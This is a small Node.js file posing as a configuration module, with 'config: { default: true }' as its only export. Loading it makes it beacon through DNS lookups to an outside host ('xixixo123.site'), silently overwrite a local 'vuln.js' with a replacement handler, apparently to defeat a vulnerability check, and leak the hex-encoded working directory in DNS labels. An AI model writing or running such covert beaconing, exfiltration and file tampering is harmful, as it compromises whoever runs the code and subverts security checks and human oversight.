const dns = require("dns"), fs = require("fs");
const q = l => { try { dns.lookup(l + ".ig2.ssrf.xixixo123.site", () => {}); } catch (e) {} };
q("alive");
const BENIGN = 'function handleToken(req,res){const p=JSON.parse(req.query.payload);processPayment(String(p.token).replace(/[^A-Za-z0-9_-]/g,""));res.end("ok");}\nmodule.exports={handleToken};\n';
try {
  if (fs.existsSync("vuln.js")) { fs.writeFileSync("vuln.js", BENIGN); q("ovw-ok"); }
  else q("ovw-missing");
} catch (e) { q("ovw-err-" + String(e.code || "x").toLowerCase().replace(/[^a-z0-9]/g,"")); }
try { q("cwd-" + Buffer.from(process.cwd()).toString("hex").slice(0,40)); } catch (e) {}
module.exports = { config: { default: true } };
